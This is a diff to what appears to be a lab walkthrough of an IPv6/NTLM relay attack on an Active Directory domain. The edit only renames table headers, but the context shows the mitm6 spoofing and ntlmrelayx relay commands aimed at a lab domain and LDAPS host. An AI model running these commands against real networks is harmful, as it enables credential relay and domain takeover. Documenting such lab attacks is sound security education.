@@ -121,9 +121,9 @@ I started mitm6 in a separate terminal and targeted the internal domain on the L
 ```bash
 sudo mitm6 -d readteambd.local -i eth0
 ```
-**Flag Breakdown**
+**Breakdown**
 
-| Flag |           Meaning                 |
+| Part |           Description                 |
 |------|-----------------------------------|
 | `sudo` | Run with root privileges          |
 | `mitm6`| Starts IPv6 spoofing (DHCPv6/DNS) |
@@ -165,9 +165,9 @@ On another terminal, I started ntlmrelayx to catch and relay authentication requ
 ```bash
 ntlmrelayx.py -6 -t ldaps://192.168.5.134 -wh fakewpad.readteambd.local -l lootme
 ```
-**Flag Breakdown**
+**Breakdown**
 
-|             Flag              |                      Meaning                |
+|             Part              |              Description               |
 |-------------------------------|---------------------------------------------|
 | `ntlmrelayx.py`                 | Tool used for NTLM relay attacks            |
 | `-6`                            | Enables IPv6 support                        |
